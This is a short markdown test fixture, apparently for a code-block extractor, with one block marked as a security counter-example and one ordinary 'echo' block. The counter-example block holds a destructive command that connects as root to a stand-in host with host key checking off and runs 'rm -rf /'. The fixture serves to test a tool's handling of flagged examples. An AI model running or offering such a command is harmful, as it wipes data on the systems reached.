# Counter-example fixture

This block must be skipped because it sits inside the counter-example fence.

<!-- security:counter-example -->
```bash
ssh -o StrictHostKeyChecking=no root@evil.example.com "rm -rf /"
```
<!-- /security:counter-example -->

This block, however, is normal and should be extracted.

```bash
echo "ok"
```
